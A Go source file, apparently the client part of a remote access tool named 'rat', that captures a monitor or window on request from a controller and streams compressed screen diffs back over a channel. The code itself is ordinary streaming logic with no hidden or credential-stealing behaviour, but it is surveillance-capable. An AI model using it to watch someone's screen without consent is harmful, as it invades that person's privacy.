package main

import (
	"bytes"
	"encoding/binary"
	"image"
	"io"
	"rat/client/screen"
	"rat/internal/imgdiff"

	"github.com/pierrec/lz4"
)

type ScreenChannel struct {
	Active bool
	Scale  float32

	// monitor or window
	Monitor bool

	// monitor/window handle
	Handle int32
}

// reset reads new config from controller
func (sc *ScreenChannel) reset(channel io.Reader) (err error) {
	binary.Read(channel, binary.LittleEndian, &sc.Monitor)
	binary.Read(channel, binary.LittleEndian, &sc.Scale)
	err = binary.Read(channel, binary.LittleEndian, &sc.Handle)

	return
}

func (sc ScreenChannel) Open(channel io.ReadWriteCloser, c *Connection) error {
	defer channel.Close()
	var err error

	err = sc.reset(channel)

	go func() {
		for {
			err = sc.reset(channel)
			if err != nil {
				channel.Close()
				return
			}
		}
	}()

	cmp := imgdiff.NewComparer()
	cmp.Mask = 0xf0f0f0ff

	capturer := &screen.ScreenCapture{}
	capturer.Start()
	defer capturer.Destroy()

	for err == nil {
		var capture image.Image
		if sc.Monitor {
			capture, _ = capturer.CaptureMonitor(screen.Monitors[sc.Handle])
		} else {
			capture, _ = capturer.CaptureWindow(int(sc.Handle))
		}

		// if sc.Scale > 0 && sc.Scale < 1.0 {
		// 	width := int(float32(rect.Dx()) * sc.Scale)
		// 	height := int(float32(rect.Dy()) * sc.Scale)

		// 	nrgba := imaging.Resize(capture, width, height, imaging.Linear)
		// 	capture = &image.RGBA{
		// 		Pix:    nrgba.Pix,
		// 		Stride: nrgba.Stride,
		// 		Rect:   nrgba.Rect,
		// 	}
		// }

		chunk := cmp.Encode(capture.(*image.RGBA))
		if chunk == nil {
			continue
		}

		binary.Write(channel, binary.LittleEndian, int32(chunk.Rect.Min.X))
		binary.Write(channel, binary.LittleEndian, int32(chunk.Rect.Min.Y))
		binary.Write(channel, binary.LittleEndian, int32(chunk.Rect.Max.X))
		binary.Write(channel, binary.LittleEndian, int32(chunk.Rect.Max.Y))

		var imgdata bytes.Buffer
		ll := lz4.NewWriter(&imgdata)
		ll.BlockMaxSize = 256 << 10
		imgdiff.Write(ll, chunk)
		ll.Close()

		binary.Write(channel, binary.LittleEndian, int32(imgdata.Len()))
		if _, err = channel.Write(imgdata.Bytes()); err != nil {
			return err
		}

		select {
		case <-c.die:
			return nil
		default:
		}
	}

	return err
}
